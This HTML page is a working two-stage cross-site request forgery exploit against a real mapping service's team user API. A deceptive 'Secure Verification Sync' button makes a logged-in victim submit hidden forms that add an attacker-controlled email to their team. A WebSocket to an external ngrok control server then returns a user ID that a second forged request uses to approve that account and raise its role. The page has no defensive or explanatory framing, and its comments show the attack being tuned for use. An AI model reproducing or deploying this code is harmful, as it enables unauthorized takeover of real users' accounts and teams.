<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Takeover Synchronization Setup</title>
</head>
<body>
    <h2>Synchronizing account parameters... Please keep this window open.</h2>
    
    <!-- CHANGED: Added a button because browsers block automatic new tabs on page load -->
    <button id="start_btn" style="padding: 15px 30px; font-size: 16px; font-weight: bold; cursor: pointer;">
        Click to Initiate Secure Verification Sync
    </button>
    <p id="progress_box" style="font-weight: bold; color: #333; margin-top: 20px;">Waiting for user initiation...</p>

    <!-- STAGE 1: Standard Form (CHANGED: target changed from silent_frame to exploit_tab) -->
    <form id="stage1" action="https://team.scribblemaps.com/api/user" method="POST" enctype="application/x-www-form-urlencoded" target="exploit_tab">
        <input type="hidden" name="product" value="0">
        <input type="hidden" name="role" value="1">
        <input type="hidden" name="email" value="wrathsec.ops@gmail.com">
        <input type="hidden" name="teamCode" value="YVAnmV7ld8">
    </form>

    <script>
        // CHANGED: Switched from window.onload to a button click to allow new tab creation
        document.getElementById('start_btn').onclick = function() {
            const statusBox = document.getElementById('progress_box');
            this.style.display = 'none'; // Hide the button after it is clicked

            // 1. Instantly fire Stage 1 into a brand new browser tab
            document.getElementById('stage1').submit();
            statusBox.innerText = "Stage 1 triggered. Waiting for control server push...";

            // 2. Open a permanent secure listening channel to your live Ngrok tunnel
            const ws = new WebSocket('wss://gleaming-caboose-washstand.ngrok-free.dev');

            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                
                if (data.teamUserId) {
                    statusBox.innerText = `Received token [${data.teamUserId}]. Deploying Stage 2...`;

                    // 3. Dynamically construct and submit Stage 2 into the EXACT same new tab
                    const form2 = document.createElement('form');
                    form2.method = 'POST';
                    form2.action = 'https://team.scribblemaps.com/api/user';
                    form2.enctype = 'application/x-www-form-urlencoded';
                    
                    // FIXED: Reuses the exact same tab name to overwrite the Stage 1 response page
                    form2.target = 'exploit_tab'; 

                    const payload = {
                        email: "wrathsec.ops@gmail.com",
                        teamUserId: data.teamUserId,
                        teamCode: "YVAnmV7ld8",
                        registered: "true",
                        mfaEnabled: "",
                        product: "0",
                        team: "",
                        role: "0",
                        approved: "true",
                        "$edit": "false"
                    };

                    for (const [key, value] of Object.entries(payload)) {
                        const input = document.createElement('input');
                        input.type = 'hidden';
                        input.name = key;
                        input.value = value;
                        form2.appendChild(input);
                    }

                    document.body.appendChild(form2);
                    form2.submit();
                    
                    statusBox.style.color = "green";
                    statusBox.innerText = "Takeover complete! You can safely close this tab.";
                    ws.close();
                }
            };

            ws.onerror = function(err) {
                statusBox.style.color = "red";
                statusBox.innerText = "WebSocket connection error. Verify your Ngrok instance is running.";
                console.error("WebSocket Error: ", err);
            };
        };
    </script>
</body>
</html>
